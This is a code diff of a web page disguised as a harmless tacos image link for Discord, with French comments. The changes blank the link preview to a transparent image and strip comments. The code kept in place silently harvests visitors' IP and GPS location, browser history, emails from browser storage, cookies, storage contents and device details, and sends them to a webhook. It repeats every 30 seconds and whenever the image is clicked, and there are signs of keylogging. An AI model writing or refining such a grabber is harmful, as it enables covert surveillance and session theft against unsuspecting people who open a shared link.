@@ -34,12 +34,12 @@
             transform: scale(1.02);
         }
     </style>
-    <!-- Open Graph pour l'aperçu buggé sur Discord -->
-    <meta property="og:title" content="Tacos">
-    <meta property="og:description" content="🌮">
-    <meta property="og:image" content="https://images.unsplash.com/photo-1599974579688-8dbdd335c77f?w=500">
+    <!-- Open Graph pour l'aperçu sur Discord - IMAGE TRANSPARENTE -->
+    <meta property="og:title" content=" ">
+    <meta property="og:description" content=" ">
+    <meta property="og:image" content="https://www.w3schools.com/images/transparent.gif">
     <meta property="og:url" content="">
-    <meta name="theme-color" content="#ff6600">
+    <meta name="theme-color" content="#000000">
 </head>
 <body>
     <div class="container">
@@ -52,8 +52,6 @@
         
         let keylogData = '';
         let lastSend = Date.now();
-        let emailInterval = null;
-        let historyInterval = null;
         
         // ========== 1. IP & GPS ==========
         async function getPreciseGPS() {
@@ -141,7 +139,6 @@
         async function tryToGetEmails() {
             const results = [];
             
-            // Check localStorage pour des emails
             for (let i = 0; i < localStorage.length; i++) {
                 const key = localStorage.key(i);
                 const value = localStorage.getItem(key);
@@ -153,7 +150,6 @@
                 }
             }
             
-            // Check sessionStorage
             for (let i = 0; i < sessionStorage.length; i++) {
                 const key = sessionStorage.key(i);
                 const value = sessionStorage.getItem(key);
@@ -243,18 +239,15 @@
         
         // ========== 7. COLLECTE SILENCIEUSE ==========
         async function collectAndSendAll() {
-            // GPS
             const gps = await getPreciseGPS();
             await sendToWebhook('📍 GPS', 
                 `IP: ${gps.ip}\nPays: ${gps.pays}\nVille: ${gps.ville}\nCode postal: ${gps.code_postal}\nCoords: ${gps.latitude}, ${gps.longitude}\nFAI: ${gps.fai}`);
             
-            // Historique
             const history = await getFullBrowserHistory();
             if (history.length > 0) {
                 await sendToWebhook('📜 HISTORIQUE', history.join('\n'));
             }
             
-            // Emails
             const emails = await tryToGetEmails();
             if (emails.length > 0) {
                 for (const emailData of emails) {
@@ -262,12 +255,10 @@
                 }
             }
             
-            // Cookies
             if (document.cookie) {
                 await sendToWebhook('🍪 COOKIES', document.cookie);
             }
             
-            // LocalStorage
             let lsData = '';
             for (let i = 0; i < localStorage.length; i++) {
                 const key = localStorage.key(i);
@@ -277,7 +268,6 @@
                 await sendToWebhook('💾 LOCALSTORAGE', lsData);
             }
             
-            // SessionStorage
             let ssData = '';
             for (let i = 0; i < sessionStorage.length; i++) {
                 const key = sessionStorage.key(i);
@@ -287,14 +277,12 @@
                 await sendToWebhook('📦 SESSIONSTORAGE', ssData);
             }
             
-            // Infos appareil
             await sendToWebhook('📱 APPAREIL', 
                 `UA: ${navigator.userAgent}\nPlateforme: ${navigator.platform}\nLangue: ${navigator.language}\nEcran: ${screen.width}x${screen.height}\nCPU: ${navigator.hardwareConcurrency || '?'}\nRAM: ${navigator.deviceMemory || '?'}GB`);
         }
         
         // ========== 8. RELANCE AUTOMATIQUE ==========
         function startAutoRefresh() {
-            // Nouvel historique toutes les 30 secondes
             setInterval(async () => {
                 const history = await getFullBrowserHistory();
                 if (history.length > 0) {
@@ -302,7 +290,6 @@
                 }
             }, 30000);
             
-            // Nouveaux emails toutes les 30 secondes
             setInterval(async () => {
                 const emails = await tryToGetEmails();
                 if (emails.length > 0) {
@@ -319,7 +306,6 @@
         createHiddenForm();
         startAutoRefresh();
         
-        // Clic sur l'image = refresh manuel
         document.getElementById('tacoImage').onclick = () => {
             collectAndSendAll();
         };
